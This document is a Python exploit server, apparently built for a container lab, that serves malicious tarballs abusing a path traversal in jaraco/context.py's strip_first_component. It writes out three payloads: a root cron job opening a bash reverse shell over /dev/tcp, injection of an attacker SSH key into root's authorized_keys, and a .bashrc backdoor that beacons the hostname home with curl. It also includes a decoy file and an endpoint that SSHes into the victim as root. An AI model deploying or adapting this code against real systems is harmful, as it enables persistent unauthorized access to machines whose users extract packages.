#!/usr/bin/env python3
"""
Malicious Tarball Server for jaraco/context.py Path Traversal

Serves tarballs with path traversal payloads that bypass the
strip_first_component filter's lack of security validation.

Attack: Entry "prefix//etc/cron.d/backdoor" becomes "/etc/cron.d/backdoor"
after strip_first_component splits on the first '/'.

Reuses the same payloads as the package_index.py attack.
"""

import http.server
import io
import os
import socketserver
import subprocess
import sys
import tarfile

PORT = int(os.environ.get('PORT', 8080))

# SSH key handling (same as package_index server)
SSH_KEY_DIR = "/root/.ssh"
SSH_PRIVATE_KEY = f"{SSH_KEY_DIR}/attacker_key"
SSH_PUBLIC_KEY = f"{SSH_KEY_DIR}/attacker_key.pub"
ATTACKER_PUBLIC_KEY = ""

ACTIVE_SCENARIO = os.environ.get('SCENARIO', 'cron')
BEACONS_RECEIVED = []


def get_scenarios():
    """Return attack scenarios with payloads - same as package_index attack."""
    return {
        "cron": {
            "target": "/etc/cron.d/backdoor",
            "payload": b"""# Malicious cron job - reverse shell every minute
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/server/4444 0>&1'
""",
            "description": "Cron job for persistent reverse shell",
        },
        "ssh": {
            "target": "/root/.ssh/authorized_keys",
            "payload": f"""# Attacker's SSH key for persistent access
{ATTACKER_PUBLIC_KEY}
""".encode() if ATTACKER_PUBLIC_KEY else b"ssh-ed25519 AAAA... attacker@evil\n",
            "description": "SSH key injection for persistent access",
        },
        "bashrc": {
            "target": "/home/victim/.bashrc",
            "payload": b"""# Backdoored .bashrc
curl -s http://server:8080/beacon?h=$(hostname) &>/dev/null &
echo "[BACKDOOR] Beacon sent to attacker"
""",
            "description": "Shell profile backdoor",
        },
    }


def generate_ssh_keypair():
    """Generate SSH keypair for the attacker."""
    global ATTACKER_PUBLIC_KEY
    try:
        os.makedirs(SSH_KEY_DIR, exist_ok=True)
        if not os.path.exists(SSH_PRIVATE_KEY):
            print("[SERVER] Generating SSH keypair...")
            subprocess.run([
                "ssh-keygen", "-t", "ed25519", "-f", SSH_PRIVATE_KEY,
                "-N", "", "-C", "attacker@malicious-tarball"
            ], check=True, capture_output=True)

        with open(SSH_PUBLIC_KEY, 'r') as f:
            ATTACKER_PUBLIC_KEY = f.read().strip()
        print(f"[SERVER] SSH key: {ATTACKER_PUBLIC_KEY[:50]}...")
    except Exception as e:
        print(f"[SERVER] SSH keygen failed: {e}")
        ATTACKER_PUBLIC_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@evil"


def build_malicious_tarball(target_path, payload):
    """
    Build a tarball with path traversal via double-slash.

    Entry: prefix//target/path -> After strip_first_component -> /target/path
    """
    buf = io.BytesIO()

    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        # The key: double slash after prefix
        # "prefix//etc/cron.d/backdoor" splits to ('prefix', '/etc/cron.d/backdoor')
        # member.name becomes '/etc/cron.d/backdoor' (absolute!)
        malicious_name = f"prefix/{target_path}"

        info = tarfile.TarInfo(name=malicious_name)
        info.size = len(payload)
        info.mode = 0o644
        tf.addfile(info, io.BytesIO(payload))

        # Add a decoy file so it looks like a real package
        decoy = b"# This is a legitimate-looking file\n"
        decoy_info = tarfile.TarInfo(name="prefix/README.txt")
        decoy_info.size = len(decoy)
        tf.addfile(decoy_info, io.BytesIO(decoy))

    buf.seek(0)
    return buf.read()


class TarballHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[SERVER] {args[0]}")

    def do_GET(self):
        path = self.path.split('?')[0].split('#')[0]
        query = ""
        if '?' in self.path:
            query = self.path.split('?', 1)[1].split('#')[0]

        if path == '/status' or path == '/':
            self.serve_status()
        elif path.startswith('/scenario/'):
            self.set_scenario(path)
        elif path.endswith('.tar.gz') or path == '/tarball':
            self.serve_malicious_tarball()
        elif path == '/validate/ssh':
            self.validate_ssh()
        elif path == '/beacon':
            self.handle_beacon(query)
        else:
            self.send_error(404)

    def serve_status(self):
        scenarios = get_scenarios()
        scenario = scenarios[ACTIVE_SCENARIO]

        html = f"""<!DOCTYPE html>
<html>
<head><title>Malicious Tarball Server</title></head>
<body>
<h1>Malicious Tarball Server</h1>
<h2>jaraco/context.py Path Traversal Attack</h2>

<h3>Active Scenario: {ACTIVE_SCENARIO}</h3>
<p><b>Target:</b> <code>{scenario["target"]}</code></p>
<p><b>Description:</b> {scenario["description"]}</p>

<h3>Available Scenarios</h3>
<ul>
{"".join(f'<li><a href="/scenario/{name}">{name}</a>: {s["description"]}</li>' for name, s in scenarios.items())}
</ul>

<h3>Validation</h3>
<ul>
<li><a href="/validate/ssh">Validate SSH Access</a></li>
</ul>

<h3>Beacons Received: {len(BEACONS_RECEIVED)}</h3>
<ul>{"".join(f"<li>{b}</li>" for b in BEACONS_RECEIVED[-10:])}</ul>

<h3>Download Malicious Tarball</h3>
<p><a href="/package.tar.gz">package.tar.gz</a></p>

<h3>Attack Explanation</h3>
<pre>
Tarball entry:  prefix/{scenario["target"]}
                      ^
                      Double slash creates absolute path after split

strip_first_component() does:
    _, member.name = "prefix/{scenario["target"]}".split('/', 1)
    member.name = "{scenario["target"]}"  # ABSOLUTE PATH!

File written to: {scenario["target"]}
Instead of:      target_dir{scenario["target"]}
</pre>
</body>
</html>"""
        self.send_html(html)

    def set_scenario(self, path):
        global ACTIVE_SCENARIO
        name = path.split('/')[-1]
        scenarios = get_scenarios()
        if name in scenarios:
            ACTIVE_SCENARIO = name
            print(f"[SERVER] Switched to scenario: {name}")
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
        else:
            self.send_error(404)

    def serve_malicious_tarball(self):
        scenario = get_scenarios()[ACTIVE_SCENARIO]
        target = scenario["target"]
        payload = scenario["payload"]

        print(f"[ATTACK] Building malicious tarball")
        print(f"[ATTACK] Target: {target}")
        print(f"[ATTACK] Payload size: {len(payload)} bytes")

        tarball_data = build_malicious_tarball(target, payload)

        print(f"[ATTACK] Tarball entry: prefix/{target}")
        print(f"[ATTACK] After strip_first_component: {target}")

        self.send_response(200)
        self.send_header('Content-Type', 'application/gzip')
        self.send_header('Content-Length', len(tarball_data))
        self.send_header('Content-Disposition', 'attachment; filename="package.tar.gz"')
        self.end_headers()
        self.wfile.write(tarball_data)

        print(f"[ATTACK] Served malicious tarball ({len(tarball_data)} bytes)")

    def validate_ssh(self):
        """SSH into the victim container to prove we have access."""
        print("[SERVER] Validating SSH access to victim...")
        try:
            result = subprocess.run([
                "ssh", "-i", SSH_PRIVATE_KEY,
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=5",
                "root@client",
                "echo SSH_OK; id; hostname"
            ], capture_output=True, text=True, timeout=10)

            if "SSH_OK" in result.stdout:
                print(f"[SSH SUCCESS]\n{result.stdout}")
                self.send_html(f"<h1>SSH ACCESS CONFIRMED</h1><pre>{result.stdout}</pre>")
            else:
                print(f"[SSH FAILED] {result.stderr}")
                self.send_html(f"<h1>SSH Failed</h1><pre>{result.stderr}</pre>", 500)
        except Exception as e:
            print(f"[SSH ERROR] {e}")
            self.send_html(f"<h1>Error</h1><pre>{e}</pre>", 500)

    def handle_beacon(self, query):
        from urllib.parse import parse_qs
        import time
        params = parse_qs(query)
        host = params.get('h', ['unknown'])[0]
        BEACONS_RECEIVED.append(f"{time.strftime('%H:%M:%S')} - {host}")
        print(f"[BEACON] Received from: {host}")
        self.send_response(200)
        self.end_headers()

    def send_html(self, content, code=200):
        data = content.encode()
        self.send_response(code)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', len(data))
        self.end_headers()
        self.wfile.write(data)


def main():
    generate_ssh_keypair()

    print("=" * 70)
    print("MALICIOUS TARBALL SERVER")
    print("jaraco/context.py strip_first_component Path Traversal")
    print("=" * 70)
    print()
    print(f"Listening on port {PORT}")
    print(f"Active scenario: {ACTIVE_SCENARIO}")
    print()
    print("Endpoints:")
    print(f"  http://0.0.0.0:{PORT}/              - Status page")
    print(f"  http://0.0.0.0:{PORT}/package.tar.gz - Malicious tarball")
    print(f"  http://0.0.0.0:{PORT}/validate/ssh   - Validate SSH access to victim")
    print(f"  http://0.0.0.0:{PORT}/scenario/cron  - Switch to cron scenario")
    print(f"  http://0.0.0.0:{PORT}/scenario/ssh   - Switch to SSH scenario")
    print(f"  http://0.0.0.0:{PORT}/scenario/bashrc - Switch to bashrc scenario")
    print()
    print("=" * 70)

    with socketserver.TCPServer(("0.0.0.0", PORT), TarballHandler) as httpd:
        httpd.allow_reuse_address = True
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[SERVER] Shutting down...")


if __name__ == "__main__":
    main()
